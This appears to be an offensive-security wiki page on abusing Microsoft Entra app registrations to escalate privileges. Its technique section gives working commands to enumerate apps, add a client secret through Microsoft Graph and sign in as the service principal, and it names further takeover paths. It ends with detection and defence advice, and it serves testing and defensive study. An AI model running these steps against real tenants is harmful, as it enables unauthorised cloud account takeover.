---
title: App registration abuse
slug: app-registration-abuse
---

> **TL;DR:** Owning an Entra app registration — directly, via an owner, or by adding a client secret — lets you act as the service principal with whatever Microsoft Graph and Azure RBAC it holds.

## What it is
An Entra "application" is the multi-tenant identity definition; the per-tenant instance is the service principal. App registrations have *owners* (manage the object), *credentials* (client secrets, certificates, federated credentials), *API permissions* (delegated + application Graph roles), and *role assignments* in Entra and Azure RBAC. Several escalation paths fall out: an owner can mint a new secret and authenticate as the SP; a Cloud Application Administrator can do the same on any SP; a tenant user with `Application.ReadWrite.OwnedBy` can elevate an app it owns; pre-consented Graph permissions like `RoleManagement.ReadWrite.Directory` are total-tenant takeover.

## Preconditions / where it applies
- Foothold as a user who owns an app registration or holds Application Administrator / Cloud Application Administrator / Hybrid Identity Administrator.
- Or: an app with `Application.ReadWrite.All`, `AppRoleAssignment.ReadWrite.All`, `RoleManagement.ReadWrite.Directory` permissions to abuse.
- Tenant has not disabled user creation of app registrations / consent.

## Technique
1. Enumerate apps you own or admin.
2. Add a client secret or federated credential.
3. Authenticate as the SP and inherit its permissions.

```bash
# ROADtools to enumerate
roadrecon auth -u user@target.onmicrosoft.com
roadrecon gather
roadrecon-gui     # browse 'Applications' and 'ServicePrincipals'
```

```bash
# Add a secret to a target app via Graph
TOKEN=...        # access token with Application.ReadWrite.OwnedBy or higher
APPID=00000000-0000-0000-0000-000000000000
curl -X POST "https://graph.microsoft.com/v1.0/applications/$APPID/addPassword" \
  -H "Authorization: Bearer $TOKEN" -H "Content-Type: application/json" \
  -d '{"passwordCredential":{"displayName":"maint"}}'
```

```bash
# Sign in as the SP and pivot
az login --service-principal -u <appId> -p <secret> --tenant <tid> --allow-no-subscriptions
az rest --method get --url https://graph.microsoft.com/v1.0/me   # SP context
```

Bonus paths: add a federated identity credential pointing at a GitHub Actions workflow you control (no secret ever leaves Entra); abuse `oauth2PermissionGrants` to grant your own user a delegated scope on a high-privilege Graph SP; weaponise a multi-tenant app you registered in your own tenant once an admin in the victim consents.

## Detection and defence
- Audit-log alerts on "Update application — Certificates and secrets management" and "Add owner to application", plus any new federated credential.
- Restrict who can register/own apps (User settings → App registrations), require admin consent for risky permissions, review consented Graph roles quarterly.
- Disable the legacy `Directory.AccessAsUser.All` consent path on user-facing apps.
- Related: [[entra-actor-token-cross-tenant]], [[entra-device-code-prt-pivot]], [[managed-identities]].

## References
- [ROADtools](https://github.com/dirkjanm/ROADtools) — enumerate apps, owners, and consented Graph permissions.
- [SpecterOps — Azure Privilege Escalation via Service Principal Abuse](https://posts.specterops.io/azure-privilege-escalation-via-service-principal-abuse-210ae2be2a5) — concrete owner-of-app escalation chains.
